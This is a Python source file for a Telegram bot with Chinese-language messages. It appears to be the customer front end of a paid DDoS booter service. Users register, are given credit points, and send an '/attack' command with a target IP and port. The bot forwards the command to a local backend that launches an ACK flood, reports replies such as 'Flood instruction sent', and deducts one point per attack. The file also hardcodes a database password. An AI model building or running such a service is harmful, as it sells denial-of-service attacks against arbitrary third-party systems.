import aiomysql
from telegram import Update
from telegram.ext import CallbackContext, CommandHandler
from telegram.ext import Updater
import datetime
import requests

from telegram.ext import CommandHandler, ApplicationBuilder


async def start(update: Update):
    async with aiomysql.create_pool(
            host='localhost',
            user='bot',
            password='eTRjYbr3yAWjYraG',
            db='bot',
            autocommit=True
    ) as pool:
        async with pool.acquire() as conn:
            async with conn.cursor() as cursor:
                user_id = update.message.from_user.id
                username = update.message.from_user.username
                register_date = datetime.date.today()
                try:
                    await cursor.execute("""
                        INSERT INTO users (user_id, username, score, register_date, is_admin, checkindate) VALUES (%s, %s, 0, %s, 0, 0)
                    """, (user_id, username, register_date))
                    update.message.reply_text("欢迎！输入help获得帮助")

                except aiomysql.MySQLIntegrityError:
                    update.message.reply_text("/start - 创建账户\n"
                                              "/cz - 修改用户积分 用户ID 积分数量\n"
                                              "/cx - 显示用户信息\n"
                                              "/attack - 攻击目标 目标IP 目标端口 模式\n")


async def change_score(update: Update, context: CallbackContext):
    async with aiomysql.create_pool(
            host='localhost',
            user='bot',
            password='eTRjYbr3yAWjYraG',
            db='bot',
            autocommit=True
    ) as pool:
        async with pool.acquire() as conn:
            async with conn.cursor() as cursor:
                user_id = update.message.from_user.id
                query = "SELECT * FROM users WHERE user_id = %s"
                await cursor.execute(query, (user_id,))
                result = await cursor.fetchone()
                if result[4] == 1:
                    if len(context.args) == 2:
                        user_id = context.args[0]
                        score = context.args[1]
                        query = "UPDATE users SET score = %s WHERE user_id = %s"
                        await cursor.execute(query, (score, user_id))
                        await conn.commit()
                        update.message.reply_text("积分修改成功！")
                    else:
                        update.message.reply_text("参数错误！")


async def info(update: Update):
    async with aiomysql.create_pool(
            host='localhost',
            user='bot',
            password='eTRjYbr3yAWjYraG',
            db='bot',
            autocommit=True
    ) as pool:
        async with pool.acquire() as conn:
            async with conn.cursor() as cursor:
                user_id = update.message.from_user.id
                try:
                    query = "SELECT * FROM users WHERE user_id = %s"
                    await cursor.execute(query, (user_id,))
                    result = await cursor.fetchone()
                    await update.message.reply_text("用户名：" + str(result[1]) + "\n"
                                                                                 "用户ID：" + str(result[0]) + "\n"
                                                                                                              "积分：" + str(
                        result[2]) + "\n"
                                     "注册日期：" + str(result[3]) + "\n"
                                                                    "是否为管理员：" + str(result[4]) + "\n")
                except:
                    await update.message.reply_text("您还没有注册！")


async def send_attack(update: Update, context: CallbackContext):
    async with aiomysql.create_pool(
            host='localhost',
            user='bot',
            password='eTRjYbr3yAWjYraG',
            db='bot',
            autocommit=True
    ) as pool:
        async with pool.acquire() as conn:
            async with conn.cursor() as cursor:
                user_id = update.message.from_user.id
                query = "SELECT * FROM users WHERE user_id = %s"
                await cursor.execute(query, (user_id,))
                result = await cursor.fetchone()
                try:
                    target = context.args[0]
                    port = context.args[1]
                    time = context.args[2]
                    if result[2] < 1:
                        await update.message.reply_text("您的积分不足！")
                    else:
                        response = requests.get(f"http://127.0.0.1:5000/telnet?host={target}&port={port}&method=ack")
                        data = response.json()
                        message = data.get('message')
                        if message == "Flood instruction sent":
                            await update.message.reply_text("攻击成功！")
                            """扣除积分"""
                            await cursor.execute("""
                                                UPDATE users
                                                SET score=score-1
                                                WHERE user_id=%s
                                            """, (user_id,))
                            await conn.commit()
                        elif message == "Flood are Full":
                            await update.message.reply_text("攻击失败,卡槽已满！")
                        elif message == "Flood is Blacklisted":
                            await update.message.reply_text("攻击失败,目标处于黑名单！")
                except:
                    update.message.reply_text("错误 请检查自己命令！")


if __name__ == '__main__':
    application = ApplicationBuilder().token('YOUR_BOT_TOKEN').build()

    start_handler = CommandHandler('start', start)
    change_score_handler = CommandHandler('cz', change_score)
    info_handler = CommandHandler('cx', info)
    send_attack_handler = CommandHandler('attack', send_attack)

    application.add_handler(start_handler)
    application.add_handler(change_score_handler)
    application.add_handler(info_handler)
    application.add_handler(send_attack_handler)

    application.run_polling()
